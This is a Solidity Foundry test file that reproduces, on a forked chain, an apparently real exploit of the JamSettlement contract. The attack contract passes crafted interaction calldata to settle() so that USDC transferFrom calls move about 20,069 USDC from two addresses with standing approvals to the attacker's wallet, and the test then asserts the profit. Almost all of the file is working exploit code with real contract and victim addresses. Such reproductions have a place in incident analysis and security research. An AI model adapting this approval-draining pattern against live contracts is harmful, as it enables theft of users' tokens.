
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import "./Base.sol";


contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.attack_contract;
    uint256 constant FORK_BLOCK = 367586044;
    uint256 constant TX_TIMESTAMP = 1754987700;
    uint256 constant TX_BLOCK_NUMBER = 367586045;
    uint256 constant TX_VALUE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"), FORK_BLOCK);
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        OurAttack attack = _deployAttackContrac();
        _prepareProfit(attack);
        _logBalances("Before exploit");
        _executeAttack(attack);
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _deployAttackContrac() internal returns (OurAttack attack) {
        _installRuntimeFallb();
        attack = OurAttack(payable(ATTACK_CONTRACT));
        _installAttackChildR();
        _bindAttackAttackChi(attack);
    }

    function _prepareProfit(OurAttack attack) internal {
        _prepareProfit(address(attack), _expectedAttackChild(attack));
    }

    function _expectedAttackChild(OurAttack attack) internal view returns (address) {
        attack;
        return Addresses.attack_child;
    }

    function _executeAttack(OurAttack attack) internal {
        attack.attack{value: TX_VALUE}();
    }

    function _installRuntimeFallb() internal {

        vm.etch(ATTACK_CONTRACT, type(OurAttack).runtimeCode);
        vm.setNonce(ATTACK_CONTRACT, 1);
    }

    function _installAttackChildR() internal {


        vm.etch(Addresses.attack_child, type(AttackChild).runtimeCode);
    }

    function _bindAttackAttackChi(OurAttack attack) internal {
        attack.bindAttackChildContracts();
    }

    function _expectProfitLegs(address attack, address attackChild) internal override {
        attack;
        attackChild;
        _expectProfit(Addresses.attacker_eoa, address(0), Addresses.USDC, "USDC", 20069560783);
    }
}

contract OurAttack {
    AttackChild public attackChild;

    constructor() payable {
        _ctorBootstrap();
    }

    function _ctorBootstrap() internal {

        if (address(attackChild) == address(0)) {
            attackChild = AttackChild(payable(0x091101B0f31833C03DddD5b6411E62a212D05875));
        }
    }

    function deployAttackChildContracts() external returns (address) {
        _ctorBootstrap();
        return address(attackChild);
    }

    function attack() external payable {
        _runAttack();
    }

    function executeSetup() external payable {
        _runAttack();
    }

    function _runAttack() internal {
        if (address(attackChild) == address(0)) _ctorBootstrap();
        _deployAttackChildCo();
    }

    function _deployAttackChildCo() public {
        {
            address created = address(attackChild);
            require(created.code.length != 0, "replay attack child runtime missing");
        }
        AttackChild(payable(address(attackChild)))._prepareAttackChild();
        AttackChild(payable(address(attackChild))).attackChildCb();
    }

    receive() external payable {}

    fallback() external payable {
        _entryCb();
    }

    function _entryCb() internal {}

    function bindAttackChildContracts() external {
        attackChild = AttackChild(payable(0x091101B0f31833C03DddD5b6411E62a212D05875));
    }

    function bindAttackChild(address attackChildAddress) external {
        attackChild = AttackChild(payable(attackChildAddress));
    }

    mapping(uint256 => uint256) private _entryCallbackCursor;
    mapping(address => uint256) private _balancerVaultPreBalance;

    function _nextEntryCb(uint256 index) internal returns (uint256 ordinal) {
        ordinal = _entryCallbackCursor[index];
        _entryCallbackCursor[index] = ordinal + 1;
    }

    function _recordBalancerPre(address[] memory tokens) internal {
        for (uint256 i = 0; i < tokens.length; i++) {
            _balancerVaultPreBalance[tokens[i]] =
                IERC20Like(tokens[i]).balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
        }
    }

    function recordBalancerPre(address[] memory tokens) external {
        _recordBalancerPre(tokens);
    }

    function balancerVaultPreBalance(address token) external view returns (uint256) {
        return _balancerVaultPreBalance[token];
    }

    function _tryHelperAt(address target, bytes memory data) internal {
        (bool ok,) = target.call(data);
        ok;
    }

    function _addressArray0() internal pure returns (address[] memory out) {
        out = new address[](0);
    }

    function _uintArray0() internal pure returns (uint256[] memory out) {
        out = new uint256[](0);
    }
}

contract AttackChild {
    receive() external payable {}

    function run() external payable {
        _handleAttackChildCa();
        return;
    }

    fallback() external payable {
        _entryCb();
    }

    function attackChildCb() external payable {
        _handleAttackChildCa();
        return;
    }

    function _entryCb() internal {}

    mapping(uint256 => uint256) private _entryCallbackCursor;
    mapping(address => uint256) private _balancerVaultPreBalance;

    function _nextEntryCb(uint256 index) internal returns (uint256 ordinal) {
        ordinal = _entryCallbackCursor[index];
        _entryCallbackCursor[index] = ordinal + 1;
    }

    function _recordBalancerPre(address[] memory tokens) internal {
        for (uint256 i = 0; i < tokens.length; i++) {
            _balancerVaultPreBalance[tokens[i]] =
                IERC20Like(tokens[i]).balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
        }
    }

    function recordBalancerPre(address[] memory tokens) external {
        _recordBalancerPre(tokens);
    }

    function balancerVaultPreBalance(address token) external view returns (uint256) {
        return _balancerVaultPreBalance[token];
    }

    function _tryHelperAt(address target, bytes memory data) internal {
        (bool ok,) = target.call(data);
        ok;
    }

    function _addressArray0() internal pure returns (address[] memory out) {
        out = new address[](0);
    }

    function _uintArray0() internal pure returns (uint256[] memory out) {
        out = new uint256[](0);
    }

    function _handleAttackChildCa() internal {
        _replayProtocolCalls();
        _replayProtocolCal2();
        _replayProtocolCal3();
        _replayProtocolCal4();
        _collectProfit();
    }

    function _replayProtocolCalls() internal {
        IERC20Like(Addresses.USDC).balanceOf(Addresses.A_0C06E0_BBF1);
    }

    function _replayProtocolCal2() internal {
        IERC20Like(Addresses.USDC).allowance(Addresses.A_0C06E0_BBF1, Addresses.JamSettlement);
    }

    function _replayProtocolCal3() internal {
        IERC20Like(Addresses.USDC).balanceOf(Addresses.A_E7EE27_B6FD);
    }

    function _replayProtocolCal4() internal {
        IERC20Like(Addresses.USDC).allowance(Addresses.A_E7EE27_B6FD, Addresses.JamSettlement);
    }

    function _collectProfit() internal {
        {
            Abi_settle_Param2[] memory abiArg2 = new Abi_settle_Param2[](2);
            abiArg2[0] = Abi_settle_Param2({
                field0: false,
                field1: Addresses.USDC,
                field2: 0,
                field3: abi.encodeWithSelector(
                    IERC20Like.transferFrom.selector,
                    Addresses.A_0C06E0_BBF1,
                    Addresses.attacker_eoa,
                    uint256(20068560783)
                )
            });
            abiArg2[1] = Abi_settle_Param2({
                field0: false,
                field1: Addresses.USDC,
                field2: 0,
                field3: abi.encodeWithSelector(
                    IERC20Like.transferFrom.selector,
                    Addresses.A_E7EE27_B6FD,
                    Addresses.attacker_eoa,
                    uint256(1000000)
                )
            });
            IJamSettlement(Addresses.JamSettlement)
                .settle(
                    Abi_settle_Param0({
                        field0: address(this),
                        field1: address(this),
                        field2: 1754987701,
                        field3: 0,
                        field4: 1,
                        field5: address(this),
                        field6: 0,
                        field7: _addressArray0(),
                        field8: _addressArray0(),
                        field9: _uintArray0(),
                        field10: _uintArray0(),
                        field11: false
                    }),
                    hex"",
                    abiArg2,
                    hex"",
                    address(this)
                );
        }
    }

    function _prepareAttackChild() public {}
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant attack_child = 0x091101B0f31833C03DddD5b6411E62a212D05875;
    address internal constant A_0C06E0_BBF1 = 0x0c06E0737e81666023bA2a4A10693e93277Cbbf1;
    address internal constant attack_contract = 0x267ACd62E4bC7c2eDbB73F9698050e99833c64f6;
    address internal constant attacker_eoa = 0x59537353248d0b12c7fCCA56a4E420ffEc4aBC91;
    address internal constant A_86E721_57B3 = 0x86E721b43d4ECFa71119Dd38c0f938A75Fdb57B3;
    address internal constant USDC = 0xaf88d065e77c8cC2239327C5EDb3A432268e5831;
    address internal constant BalancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address internal constant JamSettlement = 0xbeb0b0623f66bE8cE162EbDfA2ec543A522F4ea6;
    address internal constant A_E7EE27_B6FD = 0xe7Ee27D53578704825Cddd578cd1f15ea93eb6Fd;
    address internal constant A_FFFFFF_FFFF = 0xFFfFfFffFFfffFFfFFfFFFFFffFFFffffFfFFFfF;
}

struct Abi_settle_Param0 {
    address field0;
    address field1;
    uint256 field2;
    uint256 field3;
    uint256 field4;
    address field5;
    uint256 field6;
    address[] field7;
    address[] field8;
    uint256[] field9;
    uint256[] field10;
    bool field11;
}

struct Abi_settle_Param2 {
    bool field0;
    address field1;
    uint256 field2;
    bytes field3;
}

interface IJamSettlement {
    function settle(Abi_settle_Param0 calldata, bytes calldata, Abi_settle_Param2[] calldata, bytes calldata, address)
        external;
}

interface Iattack_child {
    function run() external;
}
